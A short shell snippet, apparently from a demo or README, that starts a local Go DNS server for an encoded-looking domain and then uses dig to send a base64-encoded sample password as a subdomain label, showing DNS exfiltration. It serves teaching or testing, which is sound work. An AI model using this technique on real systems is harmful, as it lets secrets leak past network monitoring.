```
# start the DNS server handling ZG5ZC2VJDXJPDHKK.COM on localhost:53000
go run main.go

# do a DNS query that exfiltrates encoded Pa$$w0rd and observe the server logs
dig $(echo 'Pa$$w0rd' | base64).ZG5ZC2VJDXJPDHKK.COM @localhost -p 53000 +short
```
